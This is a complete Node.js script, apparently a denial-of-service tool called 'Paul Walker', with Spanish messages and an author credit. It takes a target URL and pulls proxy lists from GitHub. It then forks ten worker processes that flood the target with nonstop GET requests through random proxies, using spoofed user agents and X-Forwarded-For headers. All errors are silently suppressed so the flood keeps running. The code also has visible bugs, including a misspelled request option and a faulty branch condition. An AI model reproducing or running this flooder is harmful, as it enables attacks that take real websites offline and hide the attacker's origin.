const axios = require('axios');
const fakeUa = require('fake-useragent');
const cluster = require('cluster');
const HttpsProxyAgent = require('https-proxy-agent');
const colors = require("colors");

async function maintenance() {
  if (process.argv.length !== 4){
    console.log("\033\143")
    console.log(" CREADO POR |JORGE KHE MAMADAS|    ".inverse)
    console.log(" https://github.com/jorgekhemamadas".inverse)
    console.log(' node paulwalker.js url código     '.underline.green)
    process.exit()
  }


  else{
    if (process.argv[3] == 'c11111'){ //red local

    }
//010101010101010100000010101010100101010101001010110100101010101010101010100100101010101010101010101010101101010101010101010101
else if(process.argv[3] == 'c82603'){

try {
        const proxyscrape_http = await axios.get(`https://raw.githubusercontent.com/UKRK/Afganistan/main/Afganist%C3%A1n`);
} catch (error) {
console.log("")
console.log("  error al intentar conectar con el tunnel ssh Afganistán :(".red)
console.log("")
}

      const proxyscrape_http = await axios.get(`https://raw.githubusercontent.com/UKRK/Afganistan/main/Afganist%C3%A1n`);
      var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
      let c82603 = proxies[Math.floor(Math.random() * proxies.length)];

      var agent = new HttpsProxyAgent('http://' + c82603);
      var cung={}
    }

//010101010100101010101010010101010101001010101010101001010110101010101010101010101011001101010101010101010101010101001011010101


//010101010101010100000010101010100101010101001010110100101010101010101010100100101010101010101010101010101101010101010101010101
else if(process.argv[3] == 'c65902'){

try {
        const proxyscrape_http = await axios.get(`https://raw.githubusercontent.com/UKRK/Albania/main/Albania`);
} catch (error) {
console.log("")
console.log("  error al intentar conectar con el tunnel ssh Albania :(".red)
console.log("")
}

      const proxyscrape_http = await axios.get(`https://raw.githubusercontent.com/UKRK/Albania/main/Albania`);
      var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
      let c65902 = proxies[Math.floor(Math.random() * proxies.length)];

      var agent = new HttpsProxyAgent('http://' + c65902);
      var cung={}
    }
//010101010100101010101010010101010101001010101010101001010110101010101010101010101011001101010101010101010101010101001011010101
    else if(process.argv[3] == 'c00000'){

try {
	const proxyscrape_http = await axios.get(`https://raw.githubusercontent.com/UKRK/Global/main/Global`);
} catch (error) {
console.log("")
console.log("  error al intentar conectar con el tunnel ssh Global :(".red)
console.log("")
}

      const proxyscrape_http = await axios.get(`https://raw.githubusercontent.com/UKRK/Global/main/Global`);
      var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');

    }
    else{
console.log('')
console.log('  red local    -  c11111')
console.log('  países          códigos  '.underline.green)
console.log('  Global       -  c00000')
console.log('  Afganistán   -  c82603')
console.log('  Albania      -  c65902')
      process.exit()
    }

    function run(){
    if (process.argv[3] == 'c11111'){
      var urlocal=process.argv[2]
      var config={
        url: process.argv[2],
        medthod:'get',
        headers:{
            'Cache-Control': 'no-cache',
            'User-Agent': fakeUa()
        }
      }


      axios(config).then(function (re){
        console.log("[Paul Walker]".blue, "red local (respuesta)>".green,re.status,urlocal.gray)
      }).catch(function (error){
        console.log("[Paul Walker]".blue, "red local (respuesta)>".red,error.response.status,urlocal.gray)

      })
    }
    else if(process.argv[3] == 'c00000', //Global
'c82603', //Afganistán
'c65902' //Albania
){
      let c00000 = proxies[Math.floor(Math.random() * proxies.length)];
      var agent = new HttpsProxyAgent('http://' + c00000);
      var url=process.argv[2]
      var cung={

        url:process.argv[2],
        httpsAgent: agent,
        medthod:'get',
        headers:{
        'User-Agent': fakeUa(),
        'Upgrade-Insecure-Requests': '1',
        'Connection':'Keep-Alive',
        'Keep-Alive': 'timeout=1,max=5',
        'Origin': 'http://' + c00000,
        'Referrer': 'http://google.com/' + c00000,
        'X-Forwarded-For': c00000


        }
      }

       var today = new Date();
       var now = today.toLocaleTimeString('en-US');

      axios(cung).then(function (res){
console.log("",now.gray,"[Paul Walker] conexion aceptada".green,res.status,url.gray,c00000.blue)
      }).catch(function (error){
console.log("",now.gray,"[Paul Walker] conexion denegada".red,error.response.status,url.gray,c00000.blue)
      })
    }

  }

}


function time(){
  setInterval(()=>{
    run()
  })
}

async function th(){
  if (cluster.isMaster){
    for (let u=0;u<10;u++){
      cluster.fork()
      console.log("\033\143")
      console.log('     P A U L  W A L K E R     '.inverse)
    }
    cluster.on('exit',function(){
      cluster.fork()
    })
  }
  else{
    time()
  }

}
th()




}






process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});
maintenance()
